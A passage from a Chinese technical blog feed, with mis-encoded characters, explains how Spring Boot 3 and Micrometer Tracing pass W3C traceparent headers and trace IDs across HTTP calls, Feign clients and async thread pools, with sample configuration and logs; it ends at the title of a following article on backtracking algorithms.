<li><strong>ä¼ æ’­é˜¶æ®µ</strong>ï¼šè°ƒç”¨ä¸‹æ¸¸æœåŠ¡æ—¶ï¼Œå°† TraceContext æ³¨å…¥åˆ° HTTP è¯·æ±‚å¤´</li>
</ol>
<h3 data-id="heading-8">3.3 å…³é”®ç»„ä»¶ï¼šW3CPropagation</h3>
<p><code>W3CPropagation</code> æ˜¯ Micrometer Tracing ä¸­è´Ÿè´£ <code>traceparent</code> è§£æå’Œæ³¨å…¥çš„æ ¸å¿ƒç»„ä»¶ã€‚å®ƒæœ‰ä¸¤ä¸ªå…³é”®æ–¹æ³•ï¼š</p>
<p><strong>æå–å™¨ï¼ˆExtractorï¼‰</strong>ï¼šä» HTTP è¯·æ±‚ä¸­è¯»å– <code>traceparent</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç å±•ç¤ºæ€è·¯</span>
TraceContext <span class="hljs-title function_">extract</span><span class="hljs-params">(HttpRequest request)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">traceparent</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"traceparent"</span>);
    <span class="hljs-keyword">if</span> (traceparent != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// è§£æï¼š00-&lt;traceId&gt;-&lt;spanId&gt;-01</span>
        <span class="hljs-keyword">return</span> parseTraceContext(traceparent);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// æ²¡æœ‰æ‰¾åˆ°ï¼Œéœ€è¦åˆ›å»ºæ–°çš„</span>
}
</code></pre>
<p><strong>æ³¨å…¥å™¨ï¼ˆInjectorï¼‰</strong>ï¼šå°† TraceContext å†™å…¥ HTTP è¯·æ±‚å¤´</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç å±•ç¤ºæ€è·¯</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(TraceContext context, HttpRequest request)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">traceparent</span> <span class="hljs-operator">=</span> format(
        <span class="hljs-string">"00-%s-%s-01"</span>,
        context.traceId(),
        context.spanId()
    );
    request.setHeader(<span class="hljs-string">"traceparent"</span>, traceparent);
}
</code></pre>
<h2 data-id="heading-9">å››ã€ä¸‰ç§è°ƒç”¨æ–¹å¼çš„ä¼ æ’­æœºåˆ¶</h2>
<p>åœ¨ Spring Boot 3 ä¸­ï¼Œé“¾è·¯è¿½è¸ªå¯¹ä¸‰ç§ä¸»è¦è°ƒç”¨æ–¹å¼æä¾›äº†è‡ªåŠ¨æ”¯æŒï¼š</p>
<h3 data-id="heading-10">4.1 RestTemplateï¼šåŒæ­¥ HTTP è°ƒç”¨</h3>
<p><strong>ä¼ æ’­æœºåˆ¶</strong>ï¼šé€šè¿‡æ‹¦æˆªå™¨åœ¨å‘é€è¯·æ±‚å‰æ³¨å…¥ <code>traceparent</code></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant A as ç”¨æˆ·æœåŠ¡&lt;br/&gt;(traceId: abc)
    participant B as RestTemplate&lt;br/&gt;æ‹¦æˆªå™¨
    participant C as å•†å“æœåŠ¡

    A-&gt;&gt;B: restTemplate.get(...)
    Note over B: ä» ThreadLocal&lt;br/&gt;è·å– TraceContext
    Note over B: åˆ›å»ºæ–° spanId
    B-&gt;&gt;C: HTTP Request&lt;br/&gt;traceparent: 00-abc-span2-01
    Note over C: æå– traceparent
    C--&gt;&gt;B: HTTP Response
    B--&gt;&gt;A: è¿”å›ç»“æœ
    
    rect rgb(255, 244, 225)
    Note over A,C: traceId ä¿æŒä¸å˜ï¼šabc&lt;br/&gt;spanId ä¸åŒï¼šspan1 â†’ span2
    end
</code></pre>
<p><strong>è‡ªåŠ¨é…ç½®åŸç†</strong>ï¼šSpring Boot 3 ä¼šè‡ªåŠ¨ä¸º <code>RestTemplate</code> bean æ·»åŠ  <code>TracingClientHttpRequestInterceptor</code></p>
<p>ä½ åªéœ€è¦æ­£å¸¸ä½¿ç”¨ RestTemplateï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> RestTemplate restTemplate;

<span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(String productId)</span> {
    <span class="hljs-comment">// æ¡†æ¶ä¼šè‡ªåŠ¨æ³¨å…¥ traceparent</span>
    <span class="hljs-keyword">return</span> restTemplate.getForObject(
        <span class="hljs-string">"http://product-service/api/product/"</span> + productId,
        Product.class
    );
}
</code></pre>
<h3 data-id="heading-11">4.2 OpenFeignï¼šå£°æ˜å¼ HTTP è°ƒç”¨</h3>
<p><strong>ä¼ æ’­æœºåˆ¶</strong>ï¼šé€šè¿‡ Feign æ‹¦æˆªå™¨åœ¨æ„é€ è¯·æ±‚æ—¶æ³¨å…¥ <code>traceparent</code></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant A as ç”¨æˆ·æœåŠ¡&lt;br/&gt;(traceId: abc)
    participant B as Feign&lt;br/&gt;æ‹¦æˆªå™¨
    participant C as å•†å“æœåŠ¡

    A-&gt;&gt;B: productClient.getProduct(id)
    Note over B: ä» ThreadLocal&lt;br/&gt;è·å– TraceContext
    Note over B: åˆ›å»ºæ–° spanId
    B-&gt;&gt;C: HTTP Request&lt;br/&gt;traceparent: 00-abc-span2-01
    Note over C: æå– traceparent
    C--&gt;&gt;B: HTTP Response
    B--&gt;&gt;A: è¿”å›ç»“æœ
    
    rect rgb(255, 225, 245)
    Note over A,C: ä¸ RestTemplate æœ¬è´¨ç›¸åŒ&lt;br/&gt;åªæ˜¯æ‹¦æˆªç‚¹ä¸åŒ
    end
</code></pre>
<p><strong>å…³é”®ä¾èµ–</strong>ï¼šéœ€è¦åŒæ—¶å¼•å…¥ <code>spring-cloud-starter-openfeign</code> å’Œ <code>micrometer-tracing-bridge-brave</code></p>
<p>ä½¿ç”¨æ–¹å¼å®Œå…¨é€æ˜ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FeignClient(name = "product-service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductFeignClient</span> {
    <span class="hljs-meta">@GetMapping("/api/product/{id}")</span>
    Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span>;
}
</code></pre>
<h3 data-id="heading-12">4.3 å¼‚æ­¥è°ƒç”¨ï¼šæœ€å®¹æ˜“å‡ºé—®é¢˜çš„åœºæ™¯</h3>
<p><strong>æ ¸å¿ƒé—®é¢˜</strong>ï¼šæ–°çº¿ç¨‹æ— æ³•è®¿é—®ä¸»çº¿ç¨‹çš„ ThreadLocal</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[ä¸»çº¿ç¨‹&lt;br/&gt;traceId: abc&lt;br/&gt;spanId: span1] --&gt;|æäº¤ä»»åŠ¡| B[çº¿ç¨‹æ± ]
    B --&gt; C[å·¥ä½œçº¿ç¨‹&lt;br/&gt;traceId: ???&lt;br/&gt;spanId: ???]
    
    style A fill:#fff4e1
    style C fill:#ffcccc
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šContext Propagation åº“</p>
<p>åŸç†æ˜¯åœ¨æäº¤ä»»åŠ¡æ—¶"æ‹å¿«ç…§"ï¼Œåœ¨æ‰§è¡Œä»»åŠ¡æ—¶"æ¢å¤å¿«ç…§"ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph Main[ä¸»çº¿ç¨‹]
        A[TraceContext&lt;br/&gt;in ThreadLocal]
        B[captureAll&lt;br/&gt;æ‹å¿«ç…§]
    end
    
    subgraph Pool[çº¿ç¨‹æ± ]
        C[Runnable&lt;br/&gt;åŒ…è£…]
    end
    
    subgraph Worker[å·¥ä½œçº¿ç¨‹]
        D[setThreadLocals&lt;br/&gt;æ¢å¤å¿«ç…§]
        E[æ‰§è¡Œä»»åŠ¡&lt;br/&gt;traceId å¯ç”¨]
    end
    
    A --&gt; B
    B --&gt; C
    C --&gt; D
    D --&gt; E
    
    style Main fill:#e1f5ff
    style Pool fill:#fff4e1
    style Worker fill:#e1ffe1
</code></pre>
<p><strong>å®ç°ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Bean(name = "taskExecutor")</span>
<span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">taskExecutor</span><span class="hljs-params">()</span> {
    <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();
    executor.setCorePoolSize(<span class="hljs-number">5</span>);
    executor.setMaxPoolSize(<span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// å…³é”®ï¼šä½¿ç”¨ TaskDecorator ä¼ é€’ä¸Šä¸‹æ–‡</span>
    executor.setTaskDecorator(runnable -&gt; {
        <span class="hljs-comment">// ä¸»çº¿ç¨‹ä¸­æ‹å¿«ç…§</span>
        <span class="hljs-type">ContextSnapshot</span> <span class="hljs-variable">snapshot</span> <span class="hljs-operator">=</span> ContextSnapshot.captureAll();
        
        <span class="hljs-keyword">return</span> () -&gt; {
            <span class="hljs-comment">// å·¥ä½œçº¿ç¨‹ä¸­æ¢å¤å¿«ç…§</span>
            <span class="hljs-keyword">try</span> (ContextSnapshot.<span class="hljs-type">Scope</span> <span class="hljs-variable">scope</span> <span class="hljs-operator">=</span> snapshot.setThreadLocals()) {
                runnable.run();
            }
        };
    });
    
    executor.initialize();
    <span class="hljs-keyword">return</span> executor;
}
</code></pre>
<p>é…åˆ <code>@Async</code> ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Async("taskExecutor")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processAsync</span><span class="hljs-params">(String userId)</span> {
    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ­£å¸¸è·å– traceId</span>
    log.info(<span class="hljs-string">"å¼‚æ­¥å¤„ç†ç”¨æˆ·: {}"</span>, userId);
}
</code></pre>
<h2 data-id="heading-13">äº”ã€å®æˆ˜éªŒè¯ï¼šçœ‹æ—¥å¿—å°±çŸ¥é“å¯¹ä¸å¯¹</h2>
<h3 data-id="heading-14">5.1 æ—¥å¿—æ ¼å¼é…ç½®</h3>
<p>åœ¨ <code>logback-spring.xml</code> ä¸­é…ç½®ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>
    %d{yyyy-MM-dd HH:mm:ss.SSS} %5p [%X{traceId},%X{spanId}] --- [%15.15t] %-40.40logger{39} : %m%n
<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>
</code></pre>
<p>è¿™æ ·æ—¥å¿—ä¼šè‡ªåŠ¨åŒ…å« traceId å’Œ spanIdï¼š</p>
<pre><code class="hljs language-ini" lang="ini">2025-01-19 10:30:45.123  INFO <span class="hljs-section">[693e7d733e60746092fcdb114196f430,92fcdb114196f430]</span> --- <span class="hljs-section">[nio-8081-exec-1]</span> c.s.user.controller.UserController : æ”¶åˆ°è¯·æ±‚
</code></pre>
<h3 data-id="heading-15">5.2 éªŒè¯ RestTemplate è°ƒç”¨</h3>
<p>å¯åŠ¨ç”¨æˆ·æœåŠ¡å’Œå•†å“æœåŠ¡ï¼Œè°ƒç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl http://localhost:8081/user/rest/U001
</code></pre>
<p>è§‚å¯Ÿæ—¥å¿—ï¼š</p>
<p><strong>ç”¨æˆ·æœåŠ¡</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">INFO <span class="hljs-section">[abc123,span1]</span> --- <span class="hljs-section">[nio-8081-exec-1]</span> UserController : ã€ç”¨æˆ·æœåŠ¡ã€‘æ”¶åˆ°è¯·æ±‚ U001
INFO <span class="hljs-section">[abc123,span1]</span> --- <span class="hljs-section">[nio-8081-exec-1]</span> UserController : ã€ç”¨æˆ·æœåŠ¡ã€‘è°ƒç”¨å•†å“æœåŠ¡
</code></pre>
<p><strong>å•†å“æœåŠ¡</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">INFO <span class="hljs-selector-attr">[abc123,span2]</span> --- <span class="hljs-selector-attr">[nio-8082-exec-1]</span> ProductController : ã€å•†å“æœåŠ¡ã€‘æ”¶åˆ°è¯·æ±‚ P001
</code></pre>
<p><strong>éªŒè¯ç‚¹</strong>ï¼š</p>
<ul>
<li>traceId ç›¸åŒï¼š<code>abc123</code></li>
<li>spanId ä¸åŒï¼šç”¨æˆ·æœåŠ¡æ˜¯ <code>span1</code>ï¼Œå•†å“æœåŠ¡æ˜¯ <code>span2</code></li>
</ul>
<h3 data-id="heading-16">5.3 éªŒè¯å¼‚æ­¥è°ƒç”¨</h3>
<p>è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl http://localhost:8081/user/async/U003
</code></pre>
<p>è§‚å¯Ÿæ—¥å¿—ï¼š</p>
<p><strong>ä¸»çº¿ç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">INFO <span class="hljs-selector-attr">[abc123,span1]</span> --- <span class="hljs-selector-attr">[nio-8081-exec-1]</span> UserController : ã€ç”¨æˆ·æœåŠ¡-å¼‚æ­¥ã€‘æ”¶åˆ°è¯·æ±‚ U003
</code></pre>
<p><strong>å¼‚æ­¥çº¿ç¨‹ï¼ˆasync-1ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">INFO <span class="hljs-section">[abc123,span1]</span> --- <span class="hljs-section">[async-1]</span> AsyncService : ã€å¼‚æ­¥ä»»åŠ¡ã€‘å¼€å§‹æ‰§è¡Œ U003
INFO <span class="hljs-section">[abc123,span1]</span> --- <span class="hljs-section">[async-1]</span> AsyncService : ã€å¼‚æ­¥ä»»åŠ¡ã€‘æ‰§è¡Œå®Œæˆ
</code></pre>
<p><strong>å¼‚æ­¥çº¿ç¨‹è°ƒç”¨å•†å“æœåŠ¡ï¼ˆasync-2ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">INFO <span class="hljs-selector-attr">[abc123,span1]</span> --- <span class="hljs-selector-attr">[async-2]</span> AsyncService : ã€å¼‚æ­¥è°ƒç”¨ã€‘å¼€å§‹è°ƒç”¨å•†å“æœåŠ¡
</code></pre>
<p><strong>å•†å“æœåŠ¡</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">INFO <span class="hljs-selector-attr">[abc123,span2]</span> --- <span class="hljs-selector-attr">[nio-8082-exec-1]</span> ProductController : ã€å•†å“æœåŠ¡ã€‘æ”¶åˆ°è¯·æ±‚ P003
</code></pre>
<p><strong>éªŒè¯ç‚¹</strong>ï¼š</p>
<ul>
<li>ä¸»çº¿ç¨‹å’Œæ‰€æœ‰å¼‚æ­¥çº¿ç¨‹çš„ traceId éƒ½æ˜¯ <code>abc123</code></li>
<li>è¯æ˜ Context Propagation æˆåŠŸä¼ é€’äº†ä¸Šä¸‹æ–‡</li>
</ul>
<h2 data-id="heading-17">å…­ã€ä»åŸç†åˆ°æŠ½è±¡ï¼šç»Ÿä¸€è§†è§’ä¸‹çš„é“¾è·¯è¿½è¸ª</h2>
<p>å‰é¢æˆ‘ä»¬ä»æŠ€æœ¯ç»†èŠ‚çš„è§’åº¦ï¼Œè¯¦ç»†åˆ†æäº† Micrometer Tracing çš„å·¥ä½œåŸç†ï¼š</p>
<ul>
<li>W3C Trace Context æ ‡å‡†å¦‚ä½•å®šä¹‰ traceparent</li>
<li>W3CPropagation å¦‚ä½•æå–å’Œæ³¨å…¥ä¸Šä¸‹æ–‡</li>
<li>ä¸‰ç§è°ƒç”¨æ–¹å¼å„è‡ªçš„ä¼ æ’­æœºåˆ¶</li>
</ul>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä»æ›´é«˜çš„æŠ½è±¡å±‚æ¬¡ï¼Œæç‚¼å‡ºé“¾è·¯è¿½è¸ªçš„æ ¸å¿ƒæ€æƒ³ã€‚</p>
<h3 data-id="heading-18">6.1 ä¸‰ä¸ªæ ¸å¿ƒæŠ½è±¡</h3>
<p>é€šè¿‡å¯¹ Micrometer Tracing çš„è§£æï¼Œå¯ä»¥æç‚¼å‡ºä¸‰ä¸ªæ ¸å¿ƒæŠ½è±¡ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[TraceContext&lt;br/&gt;é“¾è·¯ä¸Šä¸‹æ–‡] --&gt; B[W3CPropagation&lt;br/&gt;ä¼ æ’­åè®®]
    A --&gt; C[ContextSnapshot&lt;br/&gt;ä¸Šä¸‹æ–‡å¿«ç…§]
    
    B --&gt; D[HTTP è¯·æ±‚é—´ä¼ æ’­]
    C --&gt; E[çº¿ç¨‹é—´ä¼ æ’­]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e1ffe1
    style E fill:#ffe1e1
</code></pre>
<ol>
<li><strong>TraceContext</strong>ï¼šé“¾è·¯ä¸Šä¸‹æ–‡ï¼Œå­˜å‚¨ traceId å’Œ spanId</li>
<li><strong>W3CPropagation</strong>ï¼šåœ¨ HTTP è¯·æ±‚é—´ä¼ æ’­ä¸Šä¸‹æ–‡</li>
<li><strong>ContextSnapshot</strong>ï¼šåœ¨çº¿ç¨‹é—´ä¼ æ’­ä¸Šä¸‹æ–‡</li>
</ol>
<h3 data-id="heading-19">6.2 ç»Ÿä¸€çš„ä¼ æ’­æ¨¡å¼</h3>
<p>æ— è®ºæ˜¯ RestTemplateã€OpenFeign è¿˜æ˜¯å¼‚æ­¥è°ƒç”¨ï¼Œä¼ æ’­æ¨¡å¼éƒ½æ˜¯ç»Ÿä¸€çš„ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[å…¥å£æ‹¦æˆª] --&gt; B[æå–/åˆ›å»º&lt;br/&gt;TraceContext]
    B --&gt; C[ç»‘å®šåˆ°&lt;br/&gt;ThreadLocal]
    C --&gt; D[ä¸šåŠ¡é€»è¾‘]
    D --&gt; E{éœ€è¦ä¼ æ’­?}
    E --&gt;|HTTP è°ƒç”¨| F[æ³¨å…¥ HTTP å¤´]
    E --&gt;|å¼‚æ­¥ä»»åŠ¡| G[æ•è·å¿«ç…§]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e1ffe1
    style F fill:#ffe1e1
    style G fill:#f5e1ff
</code></pre>
<p><strong>ç»Ÿä¸€æµç¨‹</strong>ï¼š</p>
<ol>
<li>å…¥å£æ‹¦æˆªï¼ˆHTTP Filter æˆ–ä»»åŠ¡åŒ…è£…å™¨ï¼‰</li>
<li>æå–æˆ–åˆ›å»º TraceContext</li>
<li>ç»‘å®šåˆ°å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆThreadLocalï¼‰</li>
<li>ä¸šåŠ¡é€»è¾‘æ‰§è¡Œ</li>
<li>éœ€è¦ä¼ æ’­æ—¶ï¼Œé€šè¿‡ä¸åŒæœºåˆ¶ä¼ å‡ºå»</li>
</ol>
<h3 data-id="heading-20">6.3 è®¾è®¡æ€æƒ³ï¼šåˆ†å±‚ä¸è‡ªåŠ¨åŒ–</h3>
<p>Micrometer Tracing çš„è®¾è®¡ä½“ç°äº†ä¸¤ä¸ªé‡è¦æ€æƒ³ï¼š</p>
<p><strong>åˆ†å±‚æŠ½è±¡</strong>ï¼š</p>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   åº”ç”¨å±‚ï¼ˆä¸šåŠ¡ä»£ç ï¼‰          â”‚  ä½ çš„ä»£ç æ— æ„ŸçŸ¥
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   æ¡†æ¶å±‚ï¼ˆè‡ªåŠ¨é…ç½®ï¼‰          â”‚  Spring Boot è‡ªåŠ¨é…ç½®
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   æŠ½è±¡å±‚ï¼ˆMicrometerï¼‰        â”‚  ç»Ÿä¸€æ¥å£
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   å®ç°å±‚ï¼ˆBrave/OTelï¼‰        â”‚  å¯æ’æ‹”çš„å®ç°
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>è‡ªåŠ¨åŒ–åŸåˆ™</strong>ï¼š</p>
<ul>
<li>ä¸ä¿®æ”¹ä¸šåŠ¡ä»£ç å°±èƒ½æ¥å…¥</li>
<li>ä¸éœ€è¦æ‰‹åŠ¨ä¼ é€’ traceId</li>
<li>ä¸éœ€è¦å…³å¿ƒåº•å±‚å®ç°ï¼ˆBrave æˆ– OpenTelemetryï¼‰</li>
</ul>
<h2 data-id="heading-21">ä¸ƒã€æ€»ç»“ï¼šä»åŸç†ç†è§£åˆ°æŠ½è±¡è®¤çŸ¥</h2>
<h3 data-id="heading-22">åŸç†å±‚é¢çš„è®¤è¯†</h3>
<p>å›åˆ°æœ€å¼€å§‹çš„é—®é¢˜ï¼šå¦‚ä½•åœ¨å¾®æœåŠ¡è°ƒç”¨é“¾ä¸­è¿½è¸ªä¸€ä¸ªè¯·æ±‚ï¼Ÿ</p>
<p>ä»åŸç†å±‚é¢çœ‹ï¼Œç­”æ¡ˆæ˜¯ï¼š<strong>ç»™è¯·æ±‚åˆ†é…ä¸€ä¸ªå…¨å±€IDï¼ˆtraceIdï¼‰ï¼Œå¹¶é€šè¿‡ä¸åŒçš„ä¼ æ’­æœºåˆ¶ï¼Œåœ¨æ•´ä¸ªè°ƒç”¨é“¾ä¸­ä¼ é€’è¿™ä¸ªID</strong>ã€‚</p>
<p>Micrometer Tracing æä¾›äº†ä¸‰ç§ä¼ æ’­æœºåˆ¶ï¼š</p>

























<table><thead><tr><th>åœºæ™¯</th><th>ä¼ æ’­è½½ä½“</th><th>ä¼ æ’­æœºåˆ¶</th></tr></thead><tbody><tr><td>è·¨æœåŠ¡è°ƒç”¨ï¼ˆHTTPï¼‰</td><td>HTTP è¯·æ±‚å¤´</td><td>W3CPropagation æ³¨å…¥/æå–</td></tr><tr><td>è·¨çº¿ç¨‹è°ƒç”¨ï¼ˆå¼‚æ­¥ï¼‰</td><td>ä¸Šä¸‹æ–‡å¿«ç…§</td><td>ContextSnapshot æ•è·/æ¢å¤</td></tr><tr><td>åŒçº¿ç¨‹è°ƒç”¨</td><td>ThreadLocal</td><td>ç›´æ¥è®¿é—®</td></tr></tbody></table>
<h3 data-id="heading-23">æŠ½è±¡å±‚é¢çš„è®¤è¯†</h3>
<p>ä»æŠ½è±¡å±‚é¢çœ‹ï¼Œé“¾è·¯è¿½è¸ªçš„æœ¬è´¨æ˜¯<strong>ä¸Šä¸‹æ–‡ä¼ æ’­çš„è‡ªåŠ¨åŒ–</strong>ã€‚</p>
<p>æ•´ä¸ªä½“ç³»å»ºç«‹åœ¨ä¸¤ä¸ªåŸºç¡€ä¹‹ä¸Šï¼š</p>
<ol>
<li><strong>æ ‡å‡†åè®®</strong>ï¼šW3C Trace Contextï¼Œç¡®ä¿ä¸åŒç³»ç»Ÿé—´çš„äº’æ“ä½œæ€§</li>
<li><strong>ç»Ÿä¸€æŠ½è±¡</strong>ï¼šMicrometer Observationï¼Œå°†æŒ‡æ ‡ã€è¿½è¸ªã€æ—¥å¿—ç»Ÿä¸€ç®¡ç†</li>
</ol>
<p>Micrometer çš„è®¾è®¡å“²å­¦ä½“ç°åœ¨ï¼š</p>
<ul>
<li><strong>åˆ†å±‚è§£è€¦</strong>ï¼šåº”ç”¨å±‚ã€æ¡†æ¶å±‚ã€æŠ½è±¡å±‚ã€å®ç°å±‚å„å¸å…¶èŒ</li>
<li><strong>è‡ªåŠ¨åŒ–ä¼˜å…ˆ</strong>ï¼šä¸ä¿®æ”¹ä¸šåŠ¡ä»£ç å°±èƒ½æ¥å…¥</li>
<li><strong>æ ‡å‡†åŒ–é©±åŠ¨</strong>ï¼šéµå¾ª W3C ç­‰å›½é™…æ ‡å‡†</li>
</ul>
<h3 data-id="heading-24">é“¾è·¯è¿½è¸ªçš„ä»·å€¼</h3>
<p>æœ€åï¼Œé“¾è·¯è¿½è¸ªçš„ä»·å€¼ä¸ä»…ä»…åœ¨äº"æ‰¾åˆ°æ…¢åœ¨å“ª"ï¼Œæ›´åœ¨äºï¼š</p>
<ul>
<li><strong>å¯è§‚æµ‹æ€§</strong>ï¼šè®©ç³»ç»Ÿè¡Œä¸ºå¯è§</li>
<li><strong>å¯è¯Šæ–­æ€§</strong>ï¼šå¿«é€Ÿå®šä½é—®é¢˜æ ¹å› </li>
<li><strong>å¯ä¼˜åŒ–æ€§</strong>ï¼šåŸºäºæ•°æ®åšæ€§èƒ½ä¼˜åŒ–</li>
</ul>
<p>å½“ä½ åœ¨æ—¥å¿—ä¸­çœ‹åˆ°è¿™æ ·çš„è¾“å‡ºæ—¶ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">abc123,span1</span>] ç”¨æˆ·æœåŠ¡æ”¶åˆ°è¯·æ±‚ï¼Œè€—æ—¶<span class="hljs-number">10</span>ms
[<span class="hljs-meta">abc123,span2</span>] å•†å“æœåŠ¡æŸ¥è¯¢æ•°æ®åº“ï¼Œè€—æ—¶<span class="hljs-number">5000</span>ms
[<span class="hljs-meta">abc123,span3</span>] åº“å­˜æœåŠ¡è°ƒç”¨ç¼“å­˜ï¼Œè€—æ—¶<span class="hljs-number">5</span>ms
</code></pre>
<p>ä½ ç«‹åˆ»å°±çŸ¥é“ï¼š<strong>ç“¶é¢ˆåœ¨å•†å“æœåŠ¡çš„æ•°æ®åº“æŸ¥è¯¢</strong>ã€‚</p>
<h3 data-id="heading-25">å†™åœ¨æœ€å</h3>
<p>ç†è§£äº†åŸç†ï¼Œæ‰èƒ½åœ¨å‡ºé—®é¢˜æ—¶å¿«é€Ÿå®šä½ï¼›
ç†è§£äº†æŠ½è±¡ï¼Œæ‰èƒ½è®¾è®¡å‡ºæ›´å¥½çš„ç³»ç»Ÿã€‚</p>
<p>å¸Œæœ›è¿™ä¸¤ç¯‡æ–‡ç« èƒ½å¸®ä½ ï¼š</p>
<ul>
<li>ç¬¬ä¸€ç¯‡ï¼šå¿«é€Ÿè½åœ°é“¾è·¯è¿½è¸ª</li>
<li>ç¬¬äºŒç¯‡ï¼šæ·±åº¦ç†è§£èƒŒååŸç†</li>
</ul>
<p>è¿™å°±æ˜¯åˆ†å¸ƒå¼é“¾è·¯è¿½è¸ªçš„åŠ›é‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å›æº¯ç®—æ³•ï¼šé€‰â†’é’»â†’é€€ï¼ŒæŒæ¡ç©·ä¸¾çš„è‰ºæœ¯]]></title>    <link>https://juejin.cn/post/7596926832912351295</link>    <guid>https://juejin.cn/post/7596926832912351295</guid>    <pubDate>2026-01-19T11:17:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596926832912351295" data-draft-id="7596883689826861119" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å›æº¯ç®—æ³•ï¼šé€‰â†’é’»â†’é€€ï¼ŒæŒæ¡ç©·ä¸¾çš„è‰ºæœ¯"/> <meta itemprop="keywords" content="åç«¯,JavaScript,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-19T11:17:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢œé…±"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å›æº¯ç®—æ³•ï¼šé€‰â†’é’»â†’é€€ï¼ŒæŒæ¡ç©·ä¸¾çš„è‰ºæœ¯
